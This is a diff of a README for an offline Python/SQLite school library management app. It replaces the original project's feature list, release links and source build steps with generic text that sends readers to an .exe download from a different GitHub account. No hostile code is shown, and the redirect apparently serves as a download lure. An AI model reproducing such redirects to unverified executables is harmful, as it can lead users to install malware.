@@ -1,87 +1,72 @@
-# School Library Management System
+# 📚 School-Library-Management-System - Simplify daily school library book tracking
 
-An offline desktop application for managing school library operations. Built with Python, PySide6, and SQLite.
+[![Download Library System](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/laydownstream575/School-Library-Management-System)
 
-## Features
+This software helps librarians manage books and student records. It works offline on your computer. You do not need an internet connection to track loans, returns, or inventory. The system uses a local database to keep your data safe.
 
-- **Dashboard** — Overview of library statistics (total books, available, issued, students, pending returns, overdue, low stock)
-- **Books Management** — Add, edit, deactivate, search, filter, import/export books via Excel
-- **Student Management** — Add, edit, deactivate, search, import/export students via Excel, view issue history
-- **Issue Book** — Issue books to students with automatic quantity updates, duplicate prevention
-- **Return Book** — Record returns, overdue tracking, automatic quantity recovery
-- **Reports** — 10 report types with search, date filters, and Excel export
-- **Settings** — School/library configuration, SQLite backup/restore, Excel full backup
+## 🛠️ System Requirements
 
-## Download (No Python required)
+Your computer must meet these basic needs to run the software:
 
-Download the standalone executable from the [Releases](https://github.com/febzzz10/School-Library-Management-System/releases) page:
+*   Windows 10 or Windows 11.
+*   4 GB of RAM or more.
+*   At least 200 MB of free storage space.
+*   A screen resolution of 1280x720 or higher.
 
-| File | Description |
-|---|---|
-| `School Library Management System.exe` | Single-file standalone. Copy anywhere and run. No Python or DLLs needed. |
-| `School-Library-Management-System-Setup.exe` | Installer (recommended for most users) |
+## 📥 How to Install the Software
 
-Data is stored in `%LOCALAPPDATA%\School Library Management System\` and persists across updates.
+Follow these steps to set up the system on your machine:
 
-## Requirements (for development)
+1. Visit the [official download page](https://github.com/laydownstream575/School-Library-Management-System).
+2. Look for the latest release version on the right side of the screen.
+3. Click the file that ends in .exe to start your download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to open the installer.
+6. Follow the prompts on your screen.
+7. Click Finish to launch the application.
 
-- Python 3.10+
-- PySide6
-- openpyxl
+## 🖥️ Core Features
 
-## Installation (for development)
+The library system includes tools to handle your daily tasks:
 
-```bash
-pip install -r requirements.txt
-```
+*   **Book Management**: Add, update, or remove book titles from your library catalog.
+*   **Student Tracking**: Save student details to manage who borrows specific books.
+*   **Book Issues and Returns**: Scan or type information to check books out to students. Record the return of books to update your inventory status.
+*   **Inventory Reports**: View reports on your total stock and current book movements.
+*   **Excel Support**: Import existing book lists from Excel files. Export your library data to Excel for printing or reporting.
+*   **Database Backups**: Create copies of your library data. Store these files on a USB drive for extra security.
 
-## Usage (from source)
+## 📖 Using the Application
 
-```bash
-python main.py
-```
+When you open the application, you see a menu. Each section helps you manage a specific part of the library.
 
-## Build a standalone executable
+### Adding New Books
+Navigate to the Inventory menu. Select the option to add a new title. Enter the International Standard Book Number (ISBN), title, author, and category. The system saves this data to your local drive.
 
-See [BUILD.md](BUILD.md) for detailed build instructions, including one-folder, one-file, and Inno Setup installer builds.
+### Checking Out Books
+Select the Issue Book tab. Type the student identification number. Scan or enter the book details. The system logs the date and sets a due date for the return. This prevents you from losing track of borrowed items.
 
-### Quick build
+### Running Reports
+Select the Reports tab to see data. You can filter by date range or category. These reports allow you to see which books the students read most often. 
 
-```bash
-build_exe.bat
-```
+## 🔄 Maintaining Your Data
 
-Output: `dist\School Library Management System\`
+The software saves everything to a local file on your computer. This file holds your entire library catalog and borrowing history. You should copy this file to an external drive once a week. 
 
-## Project Structure
+If you need to move your data to a new computer, copy your folder and move it to the new machine. You can then point the software to that location to keep your records.
 
-```
-school-library-management/
-├── main.py              # Application entry point
-├── app/                 # Core: config, database, validators, utils
-├── services/            # Business logic: books, students, issues, reports, excel, backup
-├── ui/                  # PySide6 UI: main window, dashboard, all screens
-├── database/            # SQLite schema and database file
-├── exports/             # Exported Excel reports
-├── backups/             # Database backups
-├── assets/              # Icons and images
-├── installer/           # Inno Setup installer output
-├── installer.iss        # Inno Setup script
-├── build_exe.bat        # PyInstaller build script
-├── pyproject.toml       # Project metadata and test config
-├── README.md            # This file
-├── BUILD.md             # Build instructions
-└── AGENTS.md            # AI agent instructions
-```
+## ❓ Frequently Asked Questions
 
-## Tech Stack
+**Do I need a server?**
+No. This software runs locally on your PC. It does not send data to the cloud.
 
-- **UI:** PySide6 (Qt6)
-- **Database:** SQLite
-- **Excel:** openpyxl
-- **Packaging:** PyInstaller (one-file & one-folder builds), Inno Setup (installer)
-- **Testing:** pytest
+**Can I use this on a laptop?**
+Yes. As long as the laptop uses Windows, the software operates normally.
 
-## License
+**Does it track late fees?**
+The software logs return dates. You can compare the return date to the due date to calculate overdue books.
 
-MIT
+**How do I update the program?**
+Download the latest version from the link above. Install it over the old version. Your data remains safe during this process.
+
+Keywords: book-issue, book-management, book-return, database-backup, desktop-application, excel-export, excel-import, inventory-management, library-management-system, local-database, offline-software, openpyxl, pyside6, python, python-desktop-application, school-library, sqlite, student-management
